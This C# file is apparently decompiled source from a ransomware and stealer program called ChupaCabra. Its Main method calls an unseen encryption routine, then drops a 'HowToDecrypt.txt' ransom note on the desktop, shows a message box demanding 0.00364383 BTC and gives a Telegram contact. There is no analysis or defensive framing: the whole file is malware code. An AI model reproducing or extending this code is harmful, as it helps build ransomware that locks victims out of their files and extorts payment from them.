using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using loki;

namespace ns0;

internal static class Class0
{
	public static string string_0 = Path.GetTempPath() + "\\AX754VD.tmp";

	private static void Main()
	{
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		if (Settings.ransomware)
		{
			Class2.smethod_4();
			File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + "\\HowToDecrypt.txt", "IMPORTANT INFORMATION!!!!\nAll your files are encrypted with ChupaCabra:" + Settings.Stealer_version + "\nTo Decrypt: \n - Send 0.00364383 BTC to: " + Settings.bitcoin_keshel + "\n - Contact me Telegram: @C_h_u_p_a_K_a_b_r_a", Encoding.UTF8);
			Thread.Sleep(2000);
			MessageBox.Show("IMPORTANT INFORMATION!!!!\nAll your files are encrypted with ChupaCabra: " + Settings.Stealer_version + "\nTo Decrypt: \n - Send 0.00364383 BTC to: " + Settings.bitcoin_keshel + "\n - Contact me Telegram: @C_h_u_p_a_K_a_b_r_a");
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + "\\HowToDecrypt.txt");
		}
	}
}
